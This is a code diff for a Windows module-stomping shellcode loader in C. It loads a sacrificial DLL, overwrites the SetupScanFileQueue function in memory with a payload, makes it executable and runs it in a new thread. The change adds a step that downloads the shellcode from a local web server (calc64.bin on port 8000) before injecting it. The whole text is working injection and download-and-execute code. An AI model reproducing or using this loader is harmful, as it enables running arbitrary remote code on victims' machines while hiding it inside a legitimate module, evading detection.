@@ -6,70 +6,66 @@
 #define		SACRIFICIAL_FUNC		"SetupScanFileQueue"
 
 BOOL WritePayload(IN PVOID pAddress, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {
+    DWORD	dwOldProtection = NULL;
 
-	DWORD	dwOldProtection = NULL;
+    if (!VirtualProtect(pAddress, sPayloadSize, PAGE_READWRITE, &dwOldProtection)) {
+        printf("[!] VirtualProtect [RW] Failed With Error : %d \n", GetLastError());
+        return FALSE;
+    }
 
-	if (!VirtualProtect(pAddress, sPayloadSize, PAGE_READWRITE, &dwOldProtection)) {
-		printf("[!] VirtualProtect [RW] Failed With Error : %d \n", GetLastError());
-		return FALSE;
-	}
+    memcpy(pAddress, pPayload, sPayloadSize);
 
-	memcpy(pAddress, pPayload, sPayloadSize);
+    if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
+        printf("[!] VirtualProtect [RWX] Failed With Error : %d \n", GetLastError());
+        return FALSE;
+    }
 
-	if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
-		printf("[!] VirtualProtect [RWX] Failed With Error : %d \n", GetLastError());
-		return FALSE;
-	}
-
-	return TRUE;
+    return TRUE;
 }
 
-void moduleStomper(unsigned char** payload, DWORD size) {
-	PVOID		pAddress = NULL;
-	HMODULE		hModule = NULL;
-	HANDLE		hThread = NULL;
+void moduleStomper() {
+    unsigned char* payload = NULL;
+    DWORD size = 0;  // Changed to DWORD to match the fetchCode function
 
+    int result = fetchCode(L"localhost", L"/calc64.bin", 8000, &payload, &size);
+    if (result != 0) {
+        printf("[-] Failed to fetch shellcode with error code %d\n", result);
+        return;  // Changed to return; as the function is void
+    }
 
-	printf("[#] Press <Enter> To Load \"%s\" ... ", SACRIFICIAL_DLL);
-	getchar();
+    printf("[+] Received shellcode...\n");
+    for (int i = 0; i < size; ++i) {
+        printf("%02x ", payload[i]);
+        if ((i + 1) % 16 == 0) {
+            printf("\n");
+        }
+    }
+    printf("\n");
 
-	printf("[i] Loading ... ");
-	hModule = LoadLibraryA(SACRIFICIAL_DLL);
-	if (hModule == NULL) {
-		printf("[!] LoadLibraryA Failed With Error : %d \n", GetLastError());
-		return -1;
-	}
-	printf("[+] DONE \n");
+    PVOID		pAddress = NULL;
+    HMODULE		hModule = NULL;
+    HANDLE		hThread = NULL;
 
+    hModule = LoadLibraryA(SACRIFICIAL_DLL);
+    if (hModule == NULL) {
+        printf("[!] LoadLibraryA Failed With Error : %d \n", GetLastError());
+        return;
+    }
 
+    pAddress = GetProcAddress(hModule, SACRIFICIAL_FUNC);
+    if (pAddress == NULL) {
+        printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
+        return;
+    }
 
-	pAddress = GetProcAddress(hModule, SACRIFICIAL_FUNC);
-	if (pAddress == NULL) {
-		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
-		return -1;
-	}
+    if (!WritePayload(pAddress, payload, size)) {  // Used size instead of sizeof(payload)
+        return;
+    }
 
+    hThread = CreateThread(NULL, NULL, pAddress, NULL, NULL, NULL);
+    if (hThread != NULL)
+        WaitForSingleObject(hThread, INFINITE);
 
-	printf("[+] Address Of \"%s\" : 0x%p \n", SACRIFICIAL_FUNC, pAddress);
-
-
-	printf("[#] Press <Enter> To Write Payload ... ");
-	getchar();
-	printf("[i] Writing ... ");
-	if (!WritePayload(pAddress, payload, sizeof(payload))) {
-		return -1;
-	}
-	printf("[+] DONE \n");
-
-
-
-	printf("[#] Press <Enter> To Run The Payload ... ");
-	getchar();
-
-	hThread = CreateThread(NULL, NULL, pAddress, NULL, NULL, NULL);
-	if (hThread != NULL)
-		WaitForSingleObject(hThread, INFINITE);
-
-	printf("[#] Press <Enter> To Quit ... ");
-	getchar();
+    // Free the payload when you're done
+    free(payload);
 }
